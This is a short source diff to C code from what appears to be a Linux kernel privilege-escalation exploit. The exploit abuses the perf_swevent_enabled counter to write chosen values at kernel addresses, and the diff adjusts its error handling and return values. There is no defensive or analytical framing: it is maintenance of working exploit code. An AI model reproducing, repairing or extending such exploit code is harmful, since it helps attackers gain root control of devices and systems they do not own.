@@ -120,7 +120,7 @@ increment_address_value_in_child_process(unsigned long int address, int count, i
 
   perf_swevent_enabled = get_perf_swevent_enabled_address();
   if (!perf_swevent_enabled) {
-    return false;
+    return -1;
   }
 
   offset = (int)(address - perf_swevent_enabled) / 4;
@@ -154,8 +154,8 @@ perf_swevent_write_value_at_address(unsigned long int address, int value)
     char buffer[BUFFER_SIZE];
     int child_fd;
     pid = increment_address_value_in_child_process(address, PERF_SWEVENT_MAX_FILE, &child_fd);
-    if (pid == 0) {
-      return 0;
+    if (pid <= 0) {
+      return (int)pid;
     }
     read(child_fd, buffer, sizeof(buffer));
     close(child_fd);
@@ -167,8 +167,8 @@ perf_swevent_write_value_at_address(unsigned long int address, int value)
     char buffer[BUFFER_SIZE];
     int child_fd;
     pid = increment_address_value_in_child_process(address, value % PERF_SWEVENT_MAX_FILE, &child_fd);
-    if (pid == 0) {
-      return 0;
+    if (pid <= 0) {
+      return (int)pid;
     }
     read(child_fd, buffer, sizeof(buffer));
     close(child_fd);
@@ -206,6 +206,10 @@ perf_swevent_run_exploit(unsigned long int address, int value,
   bool success;
 
   number_of_children = perf_swevent_write_value_at_address(address, value);
+  if (number_of_children < 0) {
+    return false;
+  }
+
   if (number_of_children == 0) {
     while (true) {
       sleep(1);
